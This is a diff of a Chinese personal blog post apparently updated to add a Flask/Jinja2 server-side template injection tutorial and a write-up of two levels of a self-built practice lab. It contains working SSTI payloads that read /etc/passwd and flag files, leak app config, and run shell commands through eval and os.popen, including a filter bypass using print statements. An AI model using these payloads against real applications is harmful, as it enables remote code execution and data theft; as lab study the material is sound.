@@ -17,11 +17,19 @@
 <meta property="og:site_name" content="Ethe&#39;s blog">
 <meta property="og:description" content="不会python看的我好懵，一些类和魔术变量的部分都不是太懂。。。。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png">
+<meta property="og:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png">
+<meta property="og:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png">
+<meta property="og:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png">
+<meta property="og:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png">
+<meta property="og:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png">
+<meta property="og:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png">
 <meta property="article:published_time" content="2021-06-25T04:19:20.000Z">
-<meta property="article:modified_time" content="2021-06-25T08:49:47.175Z">
+<meta property="article:modified_time" content="2021-06-27T15:34:43.526Z">
 <meta property="article:author" content="Ethe">
 <meta property="article:tag" content="ssti - web学习">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png">
   
     <link rel="alternative" href="/atom.xml" title="Ethe&#39;s blog" type="application/atom+xml">
   
@@ -239,7 +247,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.4k字</span>
+      <span class="post-count">1.7k字</span>
     </span>
   </span>
 
@@ -248,7 +256,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">6分</span>
+      <span class="post-count">7分</span>
     </span>
   </span>
 </div>
@@ -266,7 +274,7 @@
   <div id="toc-article" class="toc-article">
       <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
     <strong class="toc-title">文章目录</strong>
-           
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">ssti概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wp"><span class="toc-number">2.</span> <span class="toc-text">wp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">2.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">2.2.</span> <span class="toc-text">level 2</span></a></li></ol></li></ol>
          </div>
    <script type="text/javascript">
   function showToc(){
@@ -289,13 +297,20 @@
     <p>不会python看的我好懵，一些类和魔术变量的部分都不是太懂。。。。</p>
  <span id="more"></span>
 
-<p>贴个大佬的文章</p>
+<h2 id="ssti概述"><a href="#ssti概述" class="headerlink" title="ssti概述"></a>ssti概述</h2><p>贴个大佬的文章</p>
 <p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</a></p>
 <p>SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；<br>漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。</p>
 <p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__dict__ 保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</span><br></pre></td></tr></table></figure>
 
+<p><strong>flask基本知识</strong></p>
+<p>flask采用装饰器来指定路由，默认的模板渲染引擎为Jinja2。其中模板的三种主要语法为</p>
+<ul>
+<li>：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值</li>
+<li>{ % … % }:装载一个控制语句</li>
+<li>:装载一个注释</li>
+</ul>
 <p><strong>流程：</strong></p>
 <ol>
 <li><p>​    获取基本类</p>
@@ -319,14 +334,13 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()</span><br></pre></td></tr></table></figure>
 
 <p><strong>找到重载过的<code>__init__</code>类</strong></p>
-<p>​    不带warpper的说明重载过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__</span><br><span class="line">&lt;unbound method WarningMessage.__init__</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__</span><br><span class="line">	&lt;unbound method WarningMessage.__init__</span><br></pre></td></tr></table></figure>
 
 <p> <strong>查看其引用<code>__builtins__</code></strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;]</span><br></pre></td></tr></table></figure>
 
-<p><strong>调用其中的函数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件读取</span><br><span class="line"># python3</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;cat /fl4g|base64&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># python2</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>利用eval命令执行来读取flag</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><strong>来、姿势</strong></p>
 <p><strong>1、config</strong></p>
@@ -340,7 +354,7 @@
 <p><strong>4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</strong></p>
 <p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
 <p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config[&#x27;F</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -390,7 +404,35 @@
 <li><code>~</code><br>在jinja中可以拼接字符串</li>
 <li>格式化字符串<br>同上</li>
 </ul>
-<p>先稍微写一下吧，不懂的地方好多，以后再补充，先去学python了(</p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>搭了个靶场</p>
+<p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>先找基本类</p>
+<p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p>
+<p>再获取基本类的子类</p>
+<p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p>
+<p>找到重载过的<code>__init__</code>类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p>
+<p>查看其引用<code>__builtins__</code></p>
+<p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p>
+<p>利用eval命令执行来读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>这个过滤了{ { } }，所以要采用{ % % }的形式</p>
+<p>{ % % }内加控制语句</p>
+<p>且这里展示数据要利用{ % print % }</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print &#x27;&#x27;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#x27;) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p>
+<p>还有一种是利用控制语句</p>
+<p>寻找符合条件的子类再利用WarningMessage的<code>__bulitins__</code>执行代码这个还不太懂先贴一下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for sub in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if &quot;Warn&quot; in sub.__name__%&#125;&#123;%print sub.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;type flag&quot;).read()&#x27;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>level 3</strong></p>
+<p>在学了在学了（</p>
+<p> 先稍微写一下吧，不懂的地方好多，以后再补充，先去学python了(</p>
 
     
 
@@ -559,7 +601,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">ssti概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wp"><span class="toc-number">2.</span> <span class="toc-text">wp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">2.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">2.2.</span> <span class="toc-text">level 2</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -707,15 +749,15 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">ssti - web学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">test</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">ssti - web学习</a>
               </li>
              
               <li class="article-tag-list-item">
